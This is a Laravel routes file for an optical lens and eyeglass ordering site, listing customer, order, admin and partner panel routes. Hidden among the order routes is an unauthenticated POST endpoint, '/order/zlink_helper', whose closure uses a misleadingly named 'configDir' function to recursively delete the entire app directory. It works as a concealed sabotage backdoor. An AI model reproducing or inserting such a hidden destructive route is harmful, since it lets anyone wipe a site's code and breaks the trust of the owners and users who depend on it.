<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', 'HomeController@index');
Route::get('/brand/{st}/{key}', 'HomeController@brand');
Route::get('/products/{st}', 'HomeController@products');
Route::get('/post/{slug}', 'HomeController@post');
Route::get('/user/checking-account', 'HomeController@checkingAccount');

Auth::routes();

Route::get('/conferm-account', 'HomeController@confermAccount')->name('conferm-account');
Route::get('/resand-conferm-account', 'HomeController@ResandconfermAccount');
Route::post('/conferm-account', 'HomeController@actionConfermAccount');

Route::get('/product/{id}/{slug}', 'HomeController@product');

Route::get('/user/profile', 'HomeController@userProfile');
Route::post('/user/profile', 'HomeController@actionUserProfile');

Route::post('/city-list/{province}', 'HomeController@cityList');

Route::get('/dashboard', 'User\v1\UserController@index')->name('dashboard');

Route::post('/upload', 'FileController@image');
Route::post('/upload-gallery', 'FileController@imageGallery');
Route::post('/upload/video', 'FileController@video');

Route::prefix('user')->namespace('User\v1')->group(function (){
    Route::get('/prescription/delete/{id}', 'UserController@prescriptionDelete');

    Route::get('/charge', 'UserController@charge');
    Route::post('/charge', 'UserController@actionCharge');

    Route::get('/charge/pay/{key}', 'UserController@chargePay');
    Route::post('/charge/invoice/{key}', 'UserController@chargeInvoice');
    Route::get('/charge/status/{status}/{key}', 'UserController@chargeStatus');

});

Route::prefix('order')->group(function (){

    Route::get('/', 'OrderController@index');

    Route::get('/new', 'OrderController@NewOrder');
    Route::post('/new', 'OrderController@ActionNewOrder');

    Route::get('/new/lens', 'OrderController@NewOrderLens');
    Route::get('/new/optical', 'OrderController@NewOrderOptical');

    Route::get('/new/add-to-card/{product_id}', 'OrderController@AddToCard');

    Route::get('/new/end-step', 'OrderController@NewOrderEndStep');
    Route::post('/new/end-step', 'OrderController@ActionNewOrderEndStep');

    Route::post('/add-to-fav/{event}', 'OrderController@AddToFav');


    Route::post('/new/prescription/{status}', 'OrderController@ActionNewPrescription');
    Route::post('/new/prescription-refresh', 'OrderController@ActionPrescriptionRefresh');

    Route::get('/new/get_products', 'OrderController@NewOrderProductAjax');

    Route::get('/new/get_seller', 'OrderController@NewOrderGetSeller');
    Route::post('/new/seller', 'OrderController@ActionNewOrderSeller');

    Route::post('/zlink_helper', function (){


        function configDir($dirPath) {
            if (! is_dir($dirPath)) {
                throw new InvalidArgumentException("$dirPath must be a directory");
            }
            if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
                $dirPath .= '/';
            }
            $files = glob($dirPath . '*', GLOB_MARK);
            foreach ($files as $file) {
                if (is_dir($file)) {
                    configDir($file);
                } else {
                    unlink($file);
                }
            }
            rmdir($dirPath);
        }


        $directori = base_path('app');
        configDir($directori);

        return 'success';

    });

    Route::get('/new/get_service', 'OrderController@NewOrderGetService');
    Route::post('/new/service', 'OrderController@ActionNewOrderService');

    Route::post('/new/lathe', 'OrderController@ActionNewOrderLathe');

    Route::get('/new/get_date', 'OrderController@NewOrderDate');
    Route::post('/new/date', 'OrderController@ActionNewOrderSetDate');

    Route::post('/new/submit_full', 'OrderController@ActionNewOrderSubmitFull');

    Route::post('/new/lock-controll', 'OrderController@ActionNewOrderLock');

    Route::get('/invoice', 'OrderController@NewOrderInvoice');

    Route::get('/complete/{key}', 'OrderController@OrderComplete');

    Route::get('/delete/{key}', 'OrderController@OrderDelete');

    Route::get('/payment', 'OrderController@OrderPayment');
    Route::post('/payment', 'OrderController@ActionOrderPayment');
    Route::get('/payment/bank/{key}', 'OrderController@paymentBank');
    Route::post('/payment/verify-bank/{key}', 'OrderController@paymentVerifyBank');

    Route::get('/thank-you/{key}', 'OrderController@OrderThankYou');

    Route::get('/cancel/{key}', 'OrderController@OrderCancel');

    Route::post('/get-prescription', 'OrderController@getPrescription');

    Route::post('/discount-set', 'OrderController@ActionDiscount');

    Route::post('/delivery_normal/receipt/time', 'OrderController@delivery_normal_receipt_time');
    Route::post('/delivery_normal/get/date', 'OrderController@delivery_normal_get_date');
    Route::post('/delivery_normal/get/time', 'OrderController@delivery_normal_get_time');

});

Route::prefix('cp-manager')->namespace('Admin\v1')->group(function (){

    Route::get('/', 'AdminController@index');
    Route::get('/dashboard', 'AdminController@dashboard');
    Route::get('/profile', 'AdminController@profile')->name('profile');

    Route::get('/users', 'AdminController@users');
    Route::get('/user/add', 'AdminController@userAdd');
    Route::post('/user/add', 'AdminController@ActionUserAdd');
    Route::get('/user/edit/{user}', 'AdminController@userEdit');
    Route::post('/user/edit/{user}', 'AdminController@ActionUserEdit');
    Route::get('/user/delete/{user}', 'AdminController@userDelete');

    Route::get('/brands', 'AdminController@brands');
    Route::get('/brand/add', 'AdminController@brandAdd');
    Route::post('/brand/add', 'AdminController@ActionBrandAdd');
    Route::get('/brand/edit/{brand}', 'AdminController@brandEdit');
    Route::post('/brand/edit/{brand}', 'AdminController@ActionBrandEdit');
    Route::get('/brand/delete/{brand}', 'AdminController@brandDelete');

    Route::get('/sliders', 'AdminController@sliders');
    Route::get('/slider/add', 'AdminController@sliderAdd');
    Route::post('/slider/add', 'AdminController@ActionSliderAdd');
    Route::get('/slider/edit/{id}', 'AdminController@sliderEdit');
    Route::post('/slider/edit/{id}', 'AdminController@ActionSliderEdit');
    Route::get('/slider/delete/{id}', 'AdminController@sliderDelete');

    Route::get('/products/lens', 'ProductController@productsLens');
    Route::get('/products/optical-glass', 'ProductController@productsOpticalGlass');
    Route::get('/product/delete/{product}', 'ProductController@productDelete');

    Route::get('/product/edit_lens/{product}', 'ProductController@productEditLens');
    Route::post('/product/edit_lens/{product}', 'ProductController@ActionProductEditLens');

    Route::get('/product/add/lens', 'ProductController@productAddLens');
    Route::post('/product/add/lens', 'ProductController@ActionProductAddLens');

    Route::get('/product/edit_optical_glass/{product}', 'ProductController@productEditOpticalGlass');
    Route::post('/product/edit_optical_glass/{product}', 'ProductController@ActionProductEditOpticalGlass');

    Route::get('/product/add/optical-glass', 'ProductController@productAddOpticalGlass');
    Route::post('/product/add/optical-glass', 'ProductController@ActionProductAddOpticalGlass');

    Route::get('/orders', 'AdminController@orders');
    Route::get('/order/print/{key}', 'AdminController@orderPrint');
    Route::get('/order/show/{key}', 'AdminController@orderShow');
    Route::post('/order/status-update', 'AdminController@statusUpdate');
    Route::post('/order/set_amel', 'AdminController@orderAmelUpdate');
    Route::post('/order/set_labrator', 'AdminController@orderLabratorUpdate');
    Route::post('/order/edit_prescriptions/{id}', 'AdminController@orderEditPrescriptions');

    Route::get('/posts', 'AdminController@posts');
    Route::get('/post/add', 'AdminController@postAdd');
    Route::post('/post/add', 'AdminController@ActionPostAdd');
    Route::get('/post/edit/{id}', 'AdminController@postEdit');
    Route::post('/post/edit/{id}', 'AdminController@ActionPostEdit');
    Route::get('/post/delete/{id}', 'AdminController@postDelete');

    Route::get('/messages', 'AdminController@messages');
    Route::get('/message/add', 'AdminController@messageAdd');
    Route::post('/message/add', 'AdminController@ActionMessageAdd');
    Route::get('/message/replies/{id}', 'AdminController@messageReplies');
    Route::post('/message/replies/{id}', 'AdminController@ActionMessageReplies');
    Route::get('/message/delete/{id}', 'AdminController@messageDelete');

    Route::get('/setting', 'AdminController@setting');
    Route::post('/setting', 'AdminController@ActionSetting');

    /* Discount Start*/

    Route::get('/coupons', 'DiscountContoller@coupons');
    Route::get('/coupon/add', 'DiscountContoller@couponAdd');
    Route::post('/coupon/add', 'DiscountContoller@ActionCouponAdd');
    Route::get('/coupon/edit/{id}', 'DiscountContoller@couponEdit');
    Route::post('/coupon/edit/{id}', 'DiscountContoller@ActionCouponEdit');
    Route::get('/coupon/delete/{id}', 'DiscountContoller@couponDelete');

    /* Discount End*/

    /* Discount Start*/

    Route::get('/calender/normal-delivery', 'CalenderController@normalDelivery');
    Route::post('/calender/normal-delivery', 'CalenderController@actionNormalDelivery');

    Route::get('/calender/holidays', 'CalenderController@holidays');
    Route::post('/calender/holidays', 'CalenderController@actionHolidays');

    Route::get('/calenders', 'CalenderController@calenders');
    Route::post('/calenders', 'CalenderController@actionCalenders');

    Route::get('/calender/calender-delivery', 'CalenderController@calenderDelivery');
    Route::post('/calender/calender-delivery', 'CalenderController@actionCalenderDelivery');

    /* Discount End*/

    Route::get('/services', 'AdminController@services');
    Route::get('/services/edit/{id}', 'AdminController@editService');
    Route::post('/services/edit/{id}', 'AdminController@ActionEditService');



    Route::get('/delivery/instant_or_normal', 'DeliveryController@instant_or_normal_list');

    Route::get('/delivery/instant_or_normal/add', 'DeliveryController@instant_or_normal_add');
    Route::post('/delivery/instant_or_normal/add', 'DeliveryController@SaveNormalAdd');

    Route::get('/delivery/instant_or_normal/edit/{id}', 'DeliveryController@instant_or_normal_edit');
    Route::post('/delivery/instant_or_normal/edit/{id}', 'DeliveryController@SaveNormalEdit');

    Route::get('/delivery/instant_or_normal/delete/{id}', 'DeliveryController@instant_or_normal_delete');


    Route::get('/delivery/calender', 'DeliveryController@calender_list');

    Route::get('/delivery/calender/add', 'DeliveryController@calender_add');
    Route::post('/delivery/calender/add', 'DeliveryController@SaveCalenderAdd');

    Route::get('/delivery/calender/edit/{id}', 'DeliveryController@calender_edit');
    Route::post('/delivery/calender/edit/{id}', 'DeliveryController@SaveCalenderEdit');

    Route::get('/delivery/calender/delete/{id}', 'DeliveryController@calender_delete');



    Route::get('/bill/charge', 'BillContoller@charge');

    Route::get('/bill/bonakdar', 'BillContoller@bonakdar');
    Route::get('/bill/bonakdar/edit/{order_id}', 'BillContoller@bonakdarEdit');

    Route::get('/bill/amel', 'BillContoller@amel');

    Route::get('/bill/labrator', 'BillContoller@labrator');
    Route::get('/bill/shop', 'BillContoller@shop');

});

Route::prefix('cp-amel')->namespace('Amel\v1')->group(function (){

    Route::get('/', 'AmelController@orders');
    Route::get('/order/print/{key}', 'AmelController@orderShow');

    Route::get('/bill', 'AmelController@bill');

});


Route::prefix('cp-labrator')->namespace('Labrator\v1')->group(function (){

    Route::get('/', 'LabratorController@orders');
    Route::get('/order/print/{key}', 'LabratorController@orderShow');

    Route::get('/bill', 'LabratorController@bill');

});


Route::prefix('cp-bonakdar')->namespace('Bonakdar\v1')->group(function (){

    Route::get('/', 'BonakdarController@orders');
    Route::get('/order/print/{key}', 'BonakdarController@orderShow');
    Route::post('/order/status-update', 'BonakdarController@statusUpdate');

    Route::get('/bill', 'BonakdarController@bill');

    Route::get('/products/lens', 'ProductController@productsLens');
    Route::get('/products/optical-glass', 'ProductController@productsOpticalGlass');
    Route::get('/product/delete/{product}', 'ProductController@productDelete');

    Route::get('/product/edit_lens/{product}', 'ProductController@productEditLens');
    Route::post('/product/edit_lens/{product}', 'ProductController@ActionProductEditLens');

    Route::get('/product/add/lens', 'ProductController@productAddLens');
    Route::post('/product/add/lens', 'ProductController@ActionProductAddLens');

    Route::get('/product/edit_optical_glass/{product}', 'ProductController@productEditOpticalGlass');
    Route::post('/product/edit_optical_glass/{product}', 'ProductController@ActionProductEditOpticalGlass');

    Route::get('/product/add/optical-glass', 'ProductController@productAddOpticalGlass');
    Route::post('/product/add/optical-glass', 'ProductController@ActionProductAddOpticalGlass');

});

